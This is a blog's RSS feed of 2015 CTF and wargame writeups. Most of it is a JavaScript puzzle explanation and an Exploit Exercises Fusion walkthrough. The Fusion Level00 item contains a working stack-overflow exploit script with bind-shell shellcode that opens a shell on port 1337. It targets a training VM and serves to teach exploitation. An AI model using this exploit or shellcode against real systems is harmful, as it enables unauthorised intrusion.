<?xml version="1.0" encoding="UTF-8"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>A Little (1 &lt;&lt; 3) + y</title>
    <description>Blades out like Wolverine, but it was all a huge act man. ~ octobersveryown</description>
    <link>breadchris.github.io/</link>
    <atom:link href="breadchris.github.io/feed.xml" rel="self" type="application/rss+xml" />
    
      <item>
        <title>Backdoor CTF 2015 team Writeup</title>
        <description>&lt;p&gt;true&lt;script src=&quot;https://gist.github.com/903ab79dbe94249e7322.js&quot;&gt; &lt;/script&gt;&lt;/p&gt;
</description>
        <pubDate>Mon, 04 May 2015 08:00:00 -0400</pubDate>
        <link>breadchris.github.io/ctf/format-string/2015/05/04/backdoor-team/</link>
        <guid isPermaLink="true">breadchris.github.io/ctf/format-string/2015/05/04/backdoor-team/</guid>
      </item>
    
      <item>
        <title>Bsides Vancouver CTF 2015 - Delphi</title>
        <description>&lt;p&gt;true&lt;script src=&quot;https://gist.github.com/f87a3fe5779771e5f6b9.js&quot;&gt; &lt;/script&gt;&lt;/p&gt;
</description>
        <pubDate>Sat, 04 Apr 2015 08:00:00 -0400</pubDate>
        <link>breadchris.github.io/ctf/format-string/2015/04/04/backdoor-team/</link>
        <guid isPermaLink="true">breadchris.github.io/ctf/format-string/2015/04/04/backdoor-team/</guid>
      </item>
    
      <item>
        <title>Exploit Exercises - Fusion Level01</title>
        <description>&lt;p&gt;Challenge: &lt;a href=&quot;https://exploit-exercises.com/fusion/level01/&quot; title=&quot;Fusion Level01&quot; target=&quot;_blank&quot;&gt;here&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;This level was pretty much the same code as the previous level, except we no longer have &lt;a href=&quot;http://en.wikipedia.org/wiki/Address_space_layout_randomization&quot; title=&quot;ASLR&quot; target=&quot;_blank&quot;&gt;ASLR&lt;/a&gt; turned off and the address leak of our buffer is no longer available to us:&lt;/p&gt;

&lt;p&gt;[c]
printf(“[debug] buffer is at 0x%08x :-)\n”, buffer); :D
[/c]&lt;/p&gt;

&lt;p&gt;While we really did not need this in the first challenge, because we could have used a dynamic debugger such as &lt;a href=&quot;http://www.gnu.org/software/gdb/&quot; title=&quot;gdb&quot; target=&quot;_blank&quot;&gt;gdb&lt;/a&gt; to see where our buffer was in memory. &lt;/p&gt;

&lt;p&gt;We do however, still have an executable stack. This tells us that we can still run our shellcode making our payload pretty similar to what it was in the previous level.&lt;/p&gt;

&lt;p&gt;It would be really nice to be able to get the eip register to point to our shellcode… let’s checkout what happens right before the function &lt;code&gt;fix_path&lt;/code&gt; returns using gdb.&lt;/p&gt;

&lt;p&gt;We start out by sshing into the fusion vm and startup gdb as root:&lt;/p&gt;

&lt;p&gt;[bash]
[~]$ ssh fusion@&lt;ip address=&quot;&quot; of=&quot;&quot; fusion=&quot;&quot; vm=&quot;&quot;&gt;
fusion@172.16.76.131&#39;s password: 
fusion@fusion:~$ sudo gdb
(gdb) 
[/bash]&lt;/ip&gt;&lt;/p&gt;

&lt;p&gt;Making a little python script that uses sockets to establish a connection to the fusion vm on the same port that the level01 program is listening on (20001) we can run the program and then attach to the child process on the fusion vm:&lt;/p&gt;

&lt;p&gt;[bash]
(gdb) shell pgrep level01&lt;/p&gt;

&lt;p&gt;[/bash]&lt;/p&gt;
</description>
        <pubDate>Wed, 21 Jan 2015 07:00:00 -0500</pubDate>
        <link>breadchris.github.io/wargames/fusion/exploit-exercises/2015/01/21/fusion/</link>
        <guid isPermaLink="true">breadchris.github.io/wargames/fusion/exploit-exercises/2015/01/21/fusion/</guid>
      </item>
    
      <item>
        <title>Exploit Exercises - Fusion Level00</title>
        <description>&lt;p&gt;This challenge is pretty much a straight forward stack overflow where you are using the fact that when we call real_path:&lt;/p&gt;

&lt;p&gt;[c]
int fix_path(char *path)
{
  char resolved[128];&lt;/p&gt;

&lt;p&gt;if(realpath(path, resolved) == NULL) return 1; // can’t access path. will error trying to open
  strcpy(path, resolved);
}
[/c]&lt;/p&gt;

&lt;p&gt;our &lt;code&gt;path&lt;/code&gt; variable’s size is controlled by our initial read in &lt;code&gt;parse_http_request&lt;/code&gt;:&lt;/p&gt;

&lt;p&gt;[c]
  char buffer[1024];
  char* path;
  …
  if(read(0, buffer, sizeof(buffer)) &amp;lt;= 0) errx(0, “Failed to read from remote host”);
  …
  path = &amp;amp;buffer[4];
  …
  fix_path(path);
[/c]&lt;/p&gt;

&lt;p&gt;as our &lt;code&gt;path&lt;/code&gt; variable is simply a pointer to a location in &lt;code&gt;buffer&lt;/code&gt; 4 bytes in. So looking up what &lt;code&gt;realpath&lt;/code&gt; &lt;a title=&quot;Realpath&quot; href=&quot;http://man7.org/linux/man-pages/man3/realpath.3.html&quot; target=&quot;_blank&quot;&gt;does&lt;/a&gt; we find that it will copy the given &lt;code&gt;path&lt;/code&gt; string to our &lt;code&gt;resolved&lt;/code&gt; buffer expanding any relative paths that we might have. &lt;code&gt;realpath&lt;/code&gt; will also make sure that the file actually exists and if it doesn’t it will return &lt;code&gt;NULL&lt;/code&gt;. So for our sake we really don’t care if we can access the &lt;code&gt;strcpy&lt;/code&gt; because &lt;code&gt;realpath&lt;/code&gt; will do the same thing for us!&lt;/p&gt;

&lt;p&gt;So now that we know what we are targeting, we need to make sure we pass the earlier checks to actually get to this point.&lt;/p&gt;

&lt;p&gt;[c]
  …
  if(memcmp(buffer, “GET “, 4) != 0) errx(0, “Not a GET request”); // Is “GET “ the first part of the given string?&lt;/p&gt;

&lt;p&gt;path = &amp;amp;buffer[4];
  q = strchr(path, ‘ ‘); // After the “GET “ string, is there another space?
  if(! q) errx(0, “No protocol version specified”); // If not, throw an error
  *q++ = 0; // Replace the space with a NULL character so we separate the path and protocol
  if(strncmp(q, “HTTP/1.1”, 8) != 0) errx(0, “Invalid protocol”); // Is the protocol == “HTTP/1.1”?
  …
[/c]&lt;/p&gt;

&lt;p&gt;So from this we can deduce our payload is going to be something in the form of &lt;code&gt;GET &amp;lt;fill buffer&amp;gt;&amp;lt;return address&amp;gt; HTTP/1.1&amp;lt;nop sled&amp;gt;&amp;lt;shellcode&amp;gt;&lt;/code&gt;. You can stick your shellcode in the nop sled but it is up to you :D Since we want $eip to point to our shellcode located some number of bytes away from the start of our buffer, we can start with using the buffer address that get leaked to us by the program and add some offset to get to our nop sled (the nop sled is optional here since we can really just calculate the exact offset but I was too lazy lol). Wiht some playing around in the binary you can find number of bogus characters to fill the buffer to be 139, after the 139th character, you will begin to overwrite the return address :D. Thus we would want our return address would be: buffer address + 139 + a few more to make sure we go past the return address that we stuck in there and onto the nop sled. Putting it all together we get:&lt;/p&gt;

&lt;p&gt;[python]
import sys
from os.path import expanduser
home = expanduser(“~”)
sys.path.append(home + “/Template”)
from isis import *&lt;/p&gt;

&lt;h1 id=&quot;allow-time-to-attach-debugger&quot;&gt;Allow time to attach debugger&lt;/h1&gt;
&lt;p&gt;debug = True
#change for local vs remote exploit
host = “172.16.76.131”
port = 20000&lt;/p&gt;

&lt;h1 id=&quot;set-up-connection-and-set-timeout&quot;&gt;set up connection and set timeout&lt;/h1&gt;
&lt;p&gt;def connect():
	s = get_socket((host,port))
	s.settimeout(0x1000000)
	return s&lt;/p&gt;

&lt;p&gt;s = connect()
if debug:
	raw_input(“?”)&lt;/p&gt;

&lt;h1 id=&quot;shell-bind-tcp-shellcode-port-1337---89-bytes---httpshell-stormorgshellcodefilesshellcode-882php&quot;&gt;Shell Bind TCP Shellcode Port 1337 - 89 bytes - http://shell-storm.org/shellcode/files/shellcode-882.php&lt;/h1&gt;
&lt;p&gt;shellcode = “\x6a\x66\x58\x6a\x01\x5b\x31\xf6\x56\x53\x6a\x02\x89\xe1\xcd\x80\x5f\x97\x93\xb0\x66\x56\x66\x68\x05\x39\x66\x53\x89\xe1\x6a\x10\x51\x57\x89\xe1\xcd\x80\xb0\x66\xb3\x04\x56\x57\x89\xe1\xcd\x80\xb0\x66\x43\x56\x56\x57\x89\xe1\xcd\x80\x59\x59\xb1\x02\x93\xb0\x3f\xcd\x80\x49\x79\xf9\xb0\x0b\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x41\x89\xca\xcd\x80”&lt;/p&gt;

&lt;p&gt;fill_buff = “A”*139 + lei(0xbffff8f8 + 170)&lt;/p&gt;

&lt;p&gt;payload = “GET “
payload += fill_buff
payload += “ HTTP/1.1”
payload += “\x90” * 32
payload += shellcode&lt;/p&gt;

&lt;p&gt;s.send(payload)&lt;/p&gt;

&lt;h1 id=&quot;keeps-connection-open&quot;&gt;keeps connection open&lt;/h1&gt;
&lt;p&gt;telnet_shell(s)
[/python]&lt;/p&gt;

&lt;p&gt;We then have a shell listening on port 1337 that we can nc into :D&lt;/p&gt;

&lt;p&gt;(I used a collection of helper functions from Blankwall’s Template library. I encourage you to check it out: (&lt;a href=&quot;https://github.com/blankwall/Template&quot;&gt;Github&lt;/a&gt;)&lt;/p&gt;
</description>
        <pubDate>Tue, 20 Jan 2015 07:00:00 -0500</pubDate>
        <link>breadchris.github.io/wargames/fusion/exploit-exercises/2015/01/20/fusion/</link>
        <guid isPermaLink="true">breadchris.github.io/wargames/fusion/exploit-exercises/2015/01/20/fusion/</guid>
      </item>
    
      <item>
        <title>SECCON CTF 2014 jspuzzle Writeup</title>
        <description>&lt;p&gt;If you want to try it yourself, you can download it here: &lt;a href=&quot;https://github.com/ctfs/write-ups/tree/master/seccon-ctf-2014/jspuzzle&quot; title=&quot;jspuzzle&quot; target=&quot;_blank&quot;&gt; jspuzzle on github&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;For the challenge, you were given a html page that presented you with a drag and drop form of code were specific parts of the code were blanked out and you must provide the form with the correct sequence of options from the provided bank of keywords/functions/strings. Once you were able to make the code execute and produce an alert with the value “1”, the sha1 generated from the submitted options would represent the correct flag for the challenge.&lt;/p&gt;

&lt;p&gt;What you have to realize here is that Javascript has a lot of crazy syntax that you can pull off and the difficult part is trying to understand what words from the word bank would produce runnable code.&lt;/p&gt;

&lt;p&gt;The solution for this challenge ended up being:&lt;/p&gt;

&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-javascript&quot; data-lang=&quot;javascript&quot;&gt;&lt;a name=&quot;True-1&quot;&gt;&lt;/a&gt;&lt;span class=&quot;s2&quot;&gt;&amp;quot;use strict&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;a name=&quot;True-2&quot;&gt;&lt;/a&gt;
&lt;a name=&quot;True-3&quot;&gt;&lt;/a&gt;&lt;span class=&quot;p&quot;&gt;({&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&amp;quot;function&amp;quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;function&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
&lt;a name=&quot;True-4&quot;&gt;&lt;/a&gt;  &lt;span class=&quot;k&quot;&gt;this&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&amp;quot;null&amp;quot;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;Function&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&amp;quot;return&amp;quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&amp;quot;/*^_^*/&amp;quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&amp;quot;this&amp;quot;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;))();&lt;/span&gt;
&lt;a name=&quot;True-5&quot;&gt;&lt;/a&gt;  &lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;pattern&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&amp;quot;^[w]$&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;a name=&quot;True-6&quot;&gt;&lt;/a&gt;  &lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;r&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;RegExp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;pattern&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;a name=&quot;True-7&quot;&gt;&lt;/a&gt;  &lt;span class=&quot;k&quot;&gt;this&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&amp;quot;exec&amp;quot;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;](&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;pattern&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;][&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&amp;quot;alert&amp;quot;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;](&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;a name=&quot;True-8&quot;&gt;&lt;/a&gt;&lt;span class=&quot;p&quot;&gt;}})[&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&amp;quot;Function&amp;quot;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&amp;quot;toLowerCase&amp;quot;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;]()&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;]();&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;Which is just a round-about way of doing “alert(1)”&lt;/p&gt;

&lt;p&gt;So lets break this down a little.&lt;/p&gt;

&lt;p&gt;The first part of the code: “use strict;” is “a way to opt in to a restricted variant of JavaScript” (&lt;a href=&quot;https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Strict_mode&quot;&gt;strict mode&lt;/a&gt;). Now this code will still run without that line so we can conclude that it was just there as another step for you :D&lt;/p&gt;

&lt;p&gt;The main function part was pretty cool:&lt;/p&gt;

&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-javascript&quot; data-lang=&quot;javascript&quot;&gt;&lt;a name=&quot;True-1&quot;&gt;&lt;/a&gt;&lt;span class=&quot;p&quot;&gt;({&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&amp;quot;function&amp;quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;function&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
&lt;a name=&quot;True-2&quot;&gt;&lt;/a&gt;  &lt;span class=&quot;k&quot;&gt;this&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&amp;quot;null&amp;quot;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;Function&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&amp;quot;return&amp;quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&amp;quot;/*^_^*/&amp;quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&amp;quot;this&amp;quot;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;))();&lt;/span&gt;
&lt;a name=&quot;True-3&quot;&gt;&lt;/a&gt;  &lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;pattern&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&amp;quot;^[w]$&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;a name=&quot;True-4&quot;&gt;&lt;/a&gt;  &lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;r&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;RegExp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;pattern&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;a name=&quot;True-5&quot;&gt;&lt;/a&gt;  &lt;span class=&quot;k&quot;&gt;this&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&amp;quot;exec&amp;quot;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;](&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;pattern&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;][&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&amp;quot;alert&amp;quot;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;](&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;a name=&quot;True-6&quot;&gt;&lt;/a&gt;&lt;span class=&quot;p&quot;&gt;}})&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;&lt;strong&gt;An important thing that you must realize for this challenge is that Javascript indexes all its fields and functions in a key pair mapping. So something like &lt;code&gt;console.log()&lt;/code&gt; can be rewritten as &lt;code&gt;console[&#39;log&#39;]()&lt;/code&gt;&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;So when we do ({“key”: value}) we are creating a Javascript Object which the last part of the code will actually access. So in this case we are creating js object with mapping “function” to an actual callable function.&lt;/p&gt;

&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-javascript&quot; data-lang=&quot;javascript&quot;&gt;&lt;a name=&quot;True-1&quot;&gt;&lt;/a&gt;&lt;span class=&quot;k&quot;&gt;this&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&amp;quot;null&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;will set the “null” field of the current function context, or &lt;code&gt;this&lt;/code&gt;, to be the return value of the function created on the left side of the assignment.&lt;/p&gt;

&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-javascript&quot; data-lang=&quot;javascript&quot;&gt;&lt;a name=&quot;True-1&quot;&gt;&lt;/a&gt;&lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;Function&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&amp;quot;return&amp;quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&amp;quot;/*^_^*/&amp;quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&amp;quot;this&amp;quot;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;Javascript will create a new Function object by parsing the code given to the constructor, in this case our code will look like &lt;code&gt;return this&lt;/code&gt;, which simply returns the current context of the function.&lt;/p&gt;

&lt;p&gt;So we now have our null field of this referencing itself (what a great waste of time lol). The next two lines will create a Regex Javascript object with &lt;code&gt;&quot;^[w]$&quot;&lt;/code&gt; which will only match the letter “w” (^ means that we start matching from the very beginning of the string and $ means we want the string to end with what we are matching. Since we are only matching the letter [w], “w” is the only possible string that would satisfy this regex). &lt;/p&gt;

&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-javascript&quot; data-lang=&quot;javascript&quot;&gt;&lt;a name=&quot;True-1&quot;&gt;&lt;/a&gt;&lt;span class=&quot;nx&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&amp;quot;exec&amp;quot;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;](&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;pattern&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;the code will now go to our r RegExp object and get the “exec” function (brackets in JS work similar to how they do in Python) and try to match our pattern string with “w”. Since “^[w]$” != “w”, exec will return null. Oh wait! Remember, we set this[“null”] to be a function that returns “this” right? So since exec returns null we have&lt;/p&gt;

&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-javascript&quot; data-lang=&quot;javascript&quot;&gt;&lt;a name=&quot;True-1&quot;&gt;&lt;/a&gt;&lt;span class=&quot;k&quot;&gt;this&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;kc&quot;&gt;null&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;][&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&amp;quot;alert&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;](&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;which is the same as this&lt;a href=&quot;1&quot;&gt;“alert&lt;/a&gt; which is the same as alert(1)! Sweet :D&lt;/p&gt;

&lt;p&gt;For the last part, &lt;/p&gt;

&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-javascript&quot; data-lang=&quot;javascript&quot;&gt;&lt;a name=&quot;True-1&quot;&gt;&lt;/a&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&amp;quot;Function&amp;quot;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&amp;quot;toLowerCase&amp;quot;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;]()&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;]();&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;we can rewrite it as&lt;/p&gt;

&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-javascript&quot; data-lang=&quot;javascript&quot;&gt;&lt;a name=&quot;True-1&quot;&gt;&lt;/a&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&amp;quot;Function&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;toLowerCase&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()]()&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;which is the same as&lt;/p&gt;

&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-javascript&quot; data-lang=&quot;javascript&quot;&gt;&lt;a name=&quot;True-1&quot;&gt;&lt;/a&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&amp;quot;function&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]()&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;and since this part is acting on the Object that we had in the previous part, we grab the function whose key is “function” (the alert function) and the parenthesis will execute this function.&lt;/p&gt;

&lt;p&gt;Granted I was doing this with hindsight, it is still a simple, fun challenge to think differently about Javascript :D&lt;/p&gt;
</description>
        <pubDate>Sat, 10 Jan 2015 09:05:00 -0500</pubDate>
        <link>breadchris.github.io/ctf/javascript/2015/01/10/jspuzzle/</link>
        <guid isPermaLink="true">breadchris.github.io/ctf/javascript/2015/01/10/jspuzzle/</guid>
      </item>
    
  </channel>
</rss>
